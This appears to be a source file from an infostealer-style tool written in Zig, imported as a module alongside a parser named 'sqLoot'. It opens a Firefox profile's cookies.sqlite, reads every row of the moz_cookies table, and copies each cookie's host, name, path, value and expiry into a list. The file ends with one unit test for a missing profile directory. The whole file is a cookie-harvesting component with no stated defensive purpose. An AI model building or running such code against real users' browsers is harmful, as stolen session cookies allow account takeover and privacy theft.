const std = @import("std");
const file_io = @import("../parsers/file_io.zig");
const sqLoot = @import("../parsers/sqLoot.zig");

pub const CookieEntry = struct {
    host: []const u8,
    name: []const u8,
    path: []const u8,
    value: []const u8,
    expiry: i64,
};

pub fn extractCookies(allocator: std.mem.Allocator, profile_dir: []const u8, out: *std.ArrayList(CookieEntry)) void {
    var path_buf: [512]u8 = undefined;
    const db_path = std.fmt.bufPrint(&path_buf, "{s}\\cookies.sqlite", .{profile_dir}) catch return;

    const mapped = file_io.MappedFile.open(db_path) orelse return;
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return;
    defer db.deinit();

    const rows = db.readTable("moz_cookies") catch return;
    defer {
        for (rows) |r| allocator.free(r);
        allocator.free(rows);
    }

    for (rows) |row| {
        if (row.len < 5) continue;
        const host = if (row[0] == .text) row[0].text else continue;
        const name = if (row[1] == .text) row[1].text else continue;
        const path = if (row[2] == .text) row[2].text else continue;
        const value = if (row[3] == .text) row[3].text else continue;
        const expiry = if (row[4] == .int) row[4].int else continue;

        const h = allocator.dupe(u8, host) catch break;
        const n = allocator.dupe(u8, name) catch break;
        const p = allocator.dupe(u8, path) catch break;
        const v = allocator.dupe(u8, value) catch break;
        out.append(.{ .host = h, .name = n, .path = p, .value = v, .expiry = expiry }) catch break;
    }
}

test "extractCookies file not found returns empty" {
    var list = std.ArrayList(CookieEntry).init(std.testing.allocator);
    defer {
        for (list.items) |c| {
            std.testing.allocator.free(c.host);
            std.testing.allocator.free(c.name);
            std.testing.allocator.free(c.path);
            std.testing.allocator.free(c.value);
        }
        list.deinit();
    }
    extractCookies(std.testing.allocator, "C:\\nonexistent", &list);
    try std.testing.expectEqual(@as(usize, 0), list.items.len);
}
